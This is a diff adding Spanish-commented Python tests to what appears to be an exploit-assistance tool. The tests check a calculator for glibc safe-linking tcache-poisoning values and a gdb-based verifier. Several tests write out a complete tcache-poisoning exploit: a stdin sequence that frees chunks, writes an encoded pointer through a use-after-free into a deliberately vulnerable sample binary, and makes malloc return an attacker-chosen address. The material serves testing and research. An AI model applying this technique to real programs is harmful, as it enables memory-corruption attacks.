@@ -3648,6 +3648,10 @@ def test_heap_dynamic_registered_only_when_dynamic_enabled():
     assert "heap_confirm_double_free" in names_dynamic
     assert "heap_confirm_uaf" in names_dynamic
     assert "heap_dump_state" in names_dynamic
+    assert "heap_verify_tcache_poison" in names_dynamic
+    # la calculadora del payload es pura (sin ejecucion) -- disponible SIEMPRE, no solo con
+    # enable_dynamic, igual que el resto de exploit_helpers
+    assert "heap_tcache_poison_payload" in names_static
 
 
 def _heap_pad(n):
@@ -3751,6 +3755,127 @@ def test_heap_dynamic_dump_state_reports_real_tcache_contents():
     freed_addr = after_free["label"].split("(")[1].rstrip(")")
     assert entries[0]["addr"] == freed_addr
     assert "tcache idx=" in r.data
+
+
+def test_heap_tcache_poison_payload_computes_safe_linking_xor():
+    # Calculadora pura (sin ejecucion) del motor de heap dinamico, para la primitiva de
+    # tcache/fastbin-poisoning: el valor a escribir es PROTECT_PTR(field_addr, target_addr) =
+    # (field_addr >> 12) XOR target_addr -- glibc >=2.32 (safe-linking), y como XOR con la
+    # misma clave es su propia inversa, codificar y decodificar son la misma operacion.
+    from binoracle.oracles.exploit_helpers import ExploitHelperOracle, tcache_poison_payload
+
+    assert tcache_poison_payload(0x4052a0, 0x404040) == ((0x4052a0 >> 12) ^ 0x404040)
+
+    oc = ExploitHelperOracle()
+    tool = {t.name: t for t in oc.tools()}["heap_tcache_poison_payload"]
+    r = tool.run(field_addr="0x4052a0", target_addr="0x404040")
+    assert r.ok, r.error
+    assert r.meta["encoded_value"] == tcache_poison_payload(0x4052a0, 0x404040)
+    # la decodificacion es la misma operacion con la misma clave: debe devolver target_addr
+    assert tcache_poison_payload(0x4052a0, r.meta["encoded_value"]) == 0x404040
+
+
+def _heapexp_cmd(n):
+    return ("%d\n" % n).encode()
+
+
+def test_heap_verify_tcache_poison_confirms_real_malloc_hijack():
+    # Cierra el loop end-to-end del sugeridor: heap_tcache_poison_payload calcula el payload,
+    # se escribe de verdad con la propia primitiva de overflow del binario (samples/bin/heapexp:
+    # opcion 3 "edit" escribe en un chunk YA LIBRE, el pointer no se limpia tras free -- UAF por
+    # diseno, documentado en el propio fuente), y heap_verify_tcache_poison confirma que una
+    # malloc() posterior devuelve DE VERDAD la direccion controlada por el atacante -- no una
+    # suposicion de que el calculo "deberia" funcionar.
+    import os
+    import shutil
+    from binoracle.oracles.heap_dynamic import HeapDynamicOracle
+    from binoracle.oracles.exploit_helpers import tcache_poison_payload
+    b = "samples/bin/heapexp"
+    if not os.path.exists(b) or not shutil.which("gdb"):
+        return
+
+    # gdb desactiva ASLR por defecto -- confirmado en vivo: el binario es no-PIE y la secuencia
+    # new(0);new(1);free(0);free(1) siempre libera las mismas dos direcciones fijas.
+    field_addr = 0x4052d0   # cabeza de tcache tras los dos free(): su campo 'next' es lo que
+                            # el "edit" sobre el indice 1 sobreescribe
+    target_addr = 0x405000  # direccion de 16 bytes alineada (pasa la comprobacion de glibc
+                            # "unaligned tcache chunk detected" -- ver el otro test)
+    encoded = tcache_poison_payload(field_addr, target_addr)
+    payload = encoded.to_bytes(8, "little") + b"B" * 24   # edit() escribe exactamente 0x20 bytes
+
+    c = _heapexp_cmd
+    stdin = (c(1) + c(0) + c(1) + c(1)        # new(0), new(1)
+             + c(2) + c(0) + c(2) + c(1)      # free(0), free(1) -- tcache count=2, head=idx1
+             + c(3) + c(1) + payload          # edit(1, payload) -- UAF write al chunk libre en cabeza
+             + c(1) + c(2)                     # new(2) -- pop legitimo del chunk editado
+             + c(1) + c(3)                     # new(3) -- pop del "siguiente" ya envenenado
+             + c(5))                           # quit
+
+    oc = HeapDynamicOracle(b)
+    tool = {t.name: t for t in oc.tools()}["heap_verify_tcache_poison"]
+    r = tool.run(stdin_text=stdin, target_addr=target_addr, budget_s=20)
+    assert r.ok, r.error
+    assert r.meta["verified"] is True, r.data
+    assert "0x405000" in r.meta["malloc_returns"]
+    assert "CONFIRMADO" in r.data
+
+
+def test_heap_verify_tcache_poison_no_false_positive_without_the_overflow():
+    # Mismo patron de new/new/free/free/new/new, SIN el "edit" que escribe el payload --
+    # el allocator reutiliza las direcciones legitimamente, nunca entrega target_addr.
+    import os
+    import shutil
+    from binoracle.oracles.heap_dynamic import HeapDynamicOracle
+    b = "samples/bin/heapexp"
+    if not os.path.exists(b) or not shutil.which("gdb"):
+        return
+
+    c = _heapexp_cmd
+    stdin = (c(1) + c(0) + c(1) + c(1)
+             + c(2) + c(0) + c(2) + c(1)
+             + c(1) + c(2) + c(1) + c(3)
+             + c(5))
+
+    oc = HeapDynamicOracle(b)
+    tool = {t.name: t for t in oc.tools()}["heap_verify_tcache_poison"]
+    r = tool.run(stdin_text=stdin, target_addr=0x405000, budget_s=20)
+    assert r.ok, r.error
+    assert r.meta["verified"] is False
+    assert "0x405000" not in r.meta["malloc_returns"]
+
+
+def test_heap_verify_tcache_poison_rejects_unaligned_glibc_target():
+    # Caveat real de glibc >=2.29 ("malloc(): unaligned tcache chunk detected"): un target_addr
+    # que no este alineado a 16 bytes (p.ej. la direccion de una funcion de codigo cualquiera,
+    # no un chunk real) hace que la propia glibc ABORTE antes de devolverlo -- el allocator
+    # rechaza la corrupcion. verified debe seguir siendo False: no hay que fingir que el primitivo
+    # funciona cuando glibc mismo lo bloquea.
+    import os
+    import shutil
+    from binoracle.oracles.heap_dynamic import HeapDynamicOracle
+    from binoracle.oracles.exploit_helpers import tcache_poison_payload
+    b = "samples/bin/heapexp"
+    if not os.path.exists(b) or not shutil.which("gdb"):
+        return
+
+    field_addr = 0x4052d0
+    target_addr = 0x4011c6   # win() -- no alineado a 16 bytes
+    encoded = tcache_poison_payload(field_addr, target_addr)
+    payload = encoded.to_bytes(8, "little") + b"B" * 24
+
+    c = _heapexp_cmd
+    stdin = (c(1) + c(0) + c(1) + c(1)
+             + c(2) + c(0) + c(2) + c(1)
+             + c(3) + c(1) + payload
+             + c(1) + c(2) + c(1) + c(3)
+             + c(5))
+
+    oc = HeapDynamicOracle(b)
+    tool = {t.name: t for t in oc.tools()}["heap_verify_tcache_poison"]
+    r = tool.run(stdin_text=stdin, target_addr=target_addr, budget_s=20)
+    assert r.ok, r.error
+    assert r.meta["verified"] is False
+    assert "0x4011c6" not in r.meta["malloc_returns"]
 
 
 def test_heap_dynamic_dump_state_no_false_positive_without_frees():
